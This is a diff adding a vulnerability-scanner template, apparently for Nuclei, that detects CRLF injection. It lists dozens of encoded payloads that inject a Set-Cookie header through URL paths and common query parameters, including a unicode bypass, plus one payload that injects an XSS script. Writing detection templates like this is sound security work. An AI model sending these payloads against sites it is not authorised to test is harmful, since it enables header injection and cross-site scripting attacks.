@@ -1,0 +1,99 @@
+id: crlf-injection
+
+info:
+  name: CRLF - Injection Detection
+  author: melbadry9,nadino,xElkomy
+  severity: low
+  description: CRLF sequences were not properly sanitized.
+  tags: crlf,generic
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/%0D%0ASet-Cookie:crlfinjection=crlfinjection"
+      - "{{BaseURL}}/%E5%98%8D%E5%98%8ASet-Cookie:crlfinjection=crlfinjection"  # unicode bypass
+      - "{{BaseURL}}/%0DSet-Cookie:crlfinjection=crlfinjection"
+      - "{{BaseURL}}/%0ASet-Cookie:crlfinjection=crlfinjection"
+      - "{{BaseURL}}/%3F%0DSet-Cookie%3Acrlfinjection=crlfinjection"
+      - "{{BaseURL}}/%0ASet-Cookie%3Acrlfinjection/.."
+      - "{{BaseURL}}/?Page=%0D%0ASet-Cookie:crlfinjection=crlfinjection"
+      - "{{BaseURL}}/?_url=%0D%0ASet-Cookie:crlfinjection=crlfinjection"
+      - "{{BaseURL}}/?callback=%0D%0ASet-Cookie:crlfinjection=crlfinjection"
+      - "{{BaseURL}}/?checkout_url=%0D%0ASet-Cookie:crlfinjection=crlfinjection"
+      - "{{BaseURL}}/?content=%0D%0ASet-Cookie:crlfinjection=crlfinjection"
+      - "{{BaseURL}}/?continue=%0D%0ASet-Cookie:crlfinjection=crlfinjection"
+      - "{{BaseURL}}/?continueTo=%0D%0ASet-Cookie:crlfinjection=crlfinjection"
+      - "{{BaseURL}}/?counturl=%0D%0ASet-Cookie:crlfinjection=crlfinjection"
+      - "{{BaseURL}}/?data=%0D%0ASet-Cookie:crlfinjection=crlfinjection"
+      - "{{BaseURL}}/?dest=%0D%0ASet-Cookie:crlfinjection=crlfinjection"
+      - "{{BaseURL}}/?dest_url=%0D%0ASet-Cookie:crlfinjection=crlfinjection"
+      - "{{BaseURL}}/?dir=%0D%0ASet-Cookie:crlfinjection=crlfinjection"
+      - "{{BaseURL}}/?document=%0D%0ASet-Cookie:crlfinjection=crlfinjection"
+      - "{{BaseURL}}/?domain=%0D%0ASet-Cookie:crlfinjection=crlfinjection"
+      - "{{BaseURL}}/?done=%0D%0ASet-Cookie:crlfinjection=crlfinjection"
+      - "{{BaseURL}}/?download=%0D%0ASet-Cookie:crlfinjection=crlfinjection"
+      - "{{BaseURL}}/?feed=%0D%0ASet-Cookie:crlfinjection=crlfinjection"
+      - "{{BaseURL}}/?file=%0D%0ASet-Cookie:crlfinjection=crlfinjection"
+      - "{{BaseURL}}/?host=%0D%0ASet-Cookie:crlfinjection=crlfinjection"
+      - "{{BaseURL}}/?html=%0D%0ASet-Cookie:crlfinjection=crlfinjection"
+      - "{{BaseURL}}/?http=%0D%0ASet-Cookie:crlfinjection=crlfinjection"
+      - "{{BaseURL}}/?https=%0D%0ASet-Cookie:crlfinjection=crlfinjection"
+      - "{{BaseURL}}/?image=%0D%0ASet-Cookie:crlfinjection=crlfinjection"
+      - "{{BaseURL}}/?image_src=%0D%0ASet-Cookie:crlfinjection=crlfinjection"
+      - "{{BaseURL}}/?image_url=%0D%0ASet-Cookie:crlfinjection=crlfinjection"
+      - "{{BaseURL}}/?imageurl=%0D%0ASet-Cookie:crlfinjection=crlfinjection"
+      - "{{BaseURL}}/?include=%0D%0ASet-Cookie:crlfinjection=crlfinjection"
+      - "{{BaseURL}}/?media=%0D%0ASet-Cookie:crlfinjection=crlfinjection"
+      - "{{BaseURL}}/?navigation=%0D%0ASet-Cookie:crlfinjection=crlfinjection"
+      - "{{BaseURL}}/?next=%0D%0ASet-Cookie:crlfinjection=crlfinjection"
+      - "{{BaseURL}}/?open=%0D%0ASet-Cookie:crlfinjection=crlfinjection"
+      - "{{BaseURL}}/?out=%0D%0ASet-Cookie:crlfinjection=crlfinjection"
+      - "{{BaseURL}}/?page=%0D%0ASet-Cookie:crlfinjection=crlfinjection"
+      - "{{BaseURL}}/?page_url=%0D%0ASet-Cookie:crlfinjection=crlfinjection"
+      - "{{BaseURL}}/?pageurl=%0D%0ASet-Cookie:crlfinjection=crlfinjection"
+      - "{{BaseURL}}/?path=%0D%0ASet-Cookie:crlfinjection=crlfinjection"
+      - "{{BaseURL}}/?picture=%0D%0ASet-Cookie:crlfinjection=crlfinjection"
+      - "{{BaseURL}}/?port=%0D%0ASet-Cookie:crlfinjection=crlfinjection"
+      - "{{BaseURL}}/?proxy=%0D%0ASet-Cookie:crlfinjection=crlfinjection"
+      - "{{BaseURL}}/?redir=%0D%0ASet-Cookie:crlfinjection=crlfinjection"
+      - "{{BaseURL}}/?redirect=%0D%0ASet-Cookie:crlfinjection=crlfinjection"
+      - "{{BaseURL}}/?redirectUri&redirectUrl=%0D%0ASet-Cookie:crlfinjection=crlfinjection"
+      - "{{BaseURL}}/?reference=%0D%0ASet-Cookie:crlfinjection=crlfinjection"
+      - "{{BaseURL}}/?referrer=%0D%0ASet-Cookie:crlfinjection=crlfinjection"
+      - "{{BaseURL}}/?req=%0D%0ASet-Cookie:crlfinjection=crlfinjection"
+      - "{{BaseURL}}/?request=%0D%0ASet-Cookie:crlfinjection=crlfinjection"
+      - "{{BaseURL}}/?retUrl=%0D%0ASet-Cookie:crlfinjection=crlfinjection"
+      - "{{BaseURL}}/?return=%0D%0ASet-Cookie:crlfinjection=crlfinjection"
+      - "{{BaseURL}}/?returnTo=%0D%0ASet-Cookie:crlfinjection=crlfinjection"
+      - "{{BaseURL}}/?return_path=%0D%0ASet-Cookie:crlfinjection=crlfinjection"
+      - "{{BaseURL}}/?return_to=%0D%0ASet-Cookie:crlfinjection=crlfinjection"
+      - "{{BaseURL}}/?rurl=%0D%0ASet-Cookie:crlfinjection=crlfinjection"
+      - "{{BaseURL}}/?show=%0D%0ASet-Cookie:crlfinjection=crlfinjection"
+      - "{{BaseURL}}/?site=%0D%0ASet-Cookie:crlfinjection=crlfinjection"
+      - "{{BaseURL}}/?source=%0D%0ASet-Cookie:crlfinjection=crlfinjection"
+      - "{{BaseURL}}/?src=%0D%0ASet-Cookie:crlfinjection=crlfinjection"
+      - "{{BaseURL}}/?target=%0D%0ASet-Cookie:crlfinjection=crlfinjection"
+      - "{{BaseURL}}/?to=%0D%0ASet-Cookie:crlfinjection=crlfinjection"
+      - "{{BaseURL}}/?uri=%0D%0ASet-Cookie:crlfinjection=crlfinjection"
+      - "{{BaseURL}}/?url=%0D%0ASet-Cookie:crlfinjection=crlfinjection"
+      - "{{BaseURL}}/?val=%0D%0ASet-Cookie:crlfinjection=crlfinjection"
+      - "{{BaseURL}}/?validate=%0D%0ASet-Cookie:crlfinjection=crlfinjection"
+      - "{{BaseURL}}/?view=%0D%0ASet-Cookie:crlfinjection=crlfinjection"
+      - "{{BaseURL}}/?window=%0D%0ASet-Cookie:crlfinjection=crlfinjection"
+      - "{{BaseURL}}/?redirect_to=%0D%0ASet-Cookie:crlfinjection=crlfinjection"
+      - "{{BaseURL}}/?Test=%0D%0ASet-Cookie:crlfinjection=crlfinjection"
+      - "{{BaseURL}}/%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E"
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - '(?m)^(?:Set-Cookie\s*?:(?:\s*?|.*?;\s*?))(crlfinjection=crlfinjection)(?:\s*?)(?:$|;)'
+        part: header
+
+        #condition:
+      - type: word
+        part: body
+        words:
+          - "<script>alert(document.domain)</script>"
